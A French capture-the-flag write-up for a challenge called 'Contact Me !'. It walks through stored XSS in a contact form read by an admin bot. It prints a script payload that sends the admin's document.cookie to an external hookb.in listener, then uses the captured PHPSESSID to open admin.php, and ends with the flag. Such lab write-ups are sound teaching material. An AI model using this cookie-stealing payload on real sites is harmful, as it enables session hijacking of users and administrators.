# Contact Me !

### Description
Un petit développeur a mis en place un serveur où vous pouvez le contacter.
Malheureusement, une des pages n'est pas accessible, et j'ai vraiment envie de savoir ce qu'elle cache... Vous pouvez le faire pour moi ?
<br/>

### Solution
Quand on voit le titre du challenge, on imagine assez facilement qu'il va falloir effectuer une attaque de type XSS pour pouvoir avoir accès à la page secrête.
En allant sur la page, elle revoie : <b>This page is PRIVATE!</b>

On essaye une attaque de base pour vérifier que les scripts sont exécutés par la page :
`<script>alert(1)</script>`

Le script fonctionne !
Pour accèder à la page secrète, il va sûrement falloir voler le cookie de l'administrateur.
Comme les scripts sont éxécutés par l'admin, si on écrit un payload pour renvoyer le cookie de la page, celui qui va être renvoyé le sien.

Payload : <br/>
`<script>document.write('<img src="https://hookb.in/9X1qnEMbdnI600eMoWM7?cookie='+document.cookie+'">Im a cookie stealer :p</img>');</script>`

Ce script permet de dermander à l'administrateur de renvoyer le cookie à l'adresse `https://hookb.in/9X1qnEMbdnI600eMoWM7` qui est un écouteur de requêtes.

Après envoi du payload, on retrouve bien sur l'endpoint le cookie renvoyé par l'admin : <br/> 
`cookie: PHPSESSID=3f1f8431f0ed4202893dc4cb19a36021`

Au niveau du referer dans la requête c'est intéressant de voir cela : <br/>
`referer: http://localhost/index.php?botSenpai=sess_93db8da8292c8ce9bd44f193450eb8f2`

On peut maintenant essayer de se connecter à la page admin.php en changean notre cookie.

Et voilà le flag : `Hero{b3_c4r3ful_w1th_xss_!!}`
